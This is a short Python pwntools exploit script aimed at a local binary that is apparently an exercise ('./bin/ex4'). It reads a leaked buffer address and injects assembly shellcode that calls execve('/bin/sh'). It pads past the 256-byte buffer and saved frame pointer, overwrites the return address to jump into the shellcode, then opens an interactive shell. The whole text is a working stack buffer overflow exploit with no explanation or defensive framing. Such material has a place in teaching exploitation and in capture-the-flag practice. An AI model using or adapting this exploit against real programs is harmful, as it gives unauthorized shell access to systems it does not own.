from pwn import *

context.update(arch='amd64', os='linux')

# Start the target process
target = process("./bin/ex4")
output = target.recvline().decode()  

buffer_addr = int(output.split("at ")[1], 16)

# Shellcode for execve("/bin/sh", NULL, NULL)
shellcode = asm(
    """
    jmp $+18
    pop rdi
    mov rax, 59
    xor rsi, rsi
    xor rdx, rdx
    syscall
    call $-16
    .string \"/bin/sh\"
    """
)

buffer_size_plus_rbp = 256 + 8
padding = b"A" * (buffer_size_plus_rbp - len(shellcode))
payload = shellcode + padding + p64(buffer_addr)

# Send payload
target.send(payload)
target.interactive()
